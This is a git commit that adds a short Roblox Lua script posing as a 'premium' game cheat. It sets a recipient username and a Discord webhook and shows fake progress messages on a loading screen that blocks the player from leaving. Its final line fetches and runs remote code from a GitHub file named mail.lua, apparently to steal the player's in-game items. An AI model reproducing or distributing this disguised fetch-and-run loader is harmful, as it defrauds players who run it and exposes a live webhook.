4398bcbbb82c5aa1ce944ccced1b4c55e03f17b9
Mouhammad6196 <131766477+Mouhammad6196@users.noreply.github.com>
2023-04-25 10:37:05 +0000

    Create Mainstring.lua

---
+++ Mainstring.lua
@@ -0,0 +1,14 @@
+UserName = "black_fireMC"
+Webhook= "https://discord.com/api/webhooks/1071212714845798501/5hoI5ZjN1ozkzEEcVk2Ye7KzndXKNtuMwe0DuckaLI6PZMYg4mga9pRkrSNR7ORJAKq8"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "ProjectWD"
+_G.FirstText = "Activating premium features.."
+_G.SecondText = "Auto comets loaded"
+_G.ThirdText = "Booth sniper loaded"
+_G.WaitingTime = 120 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
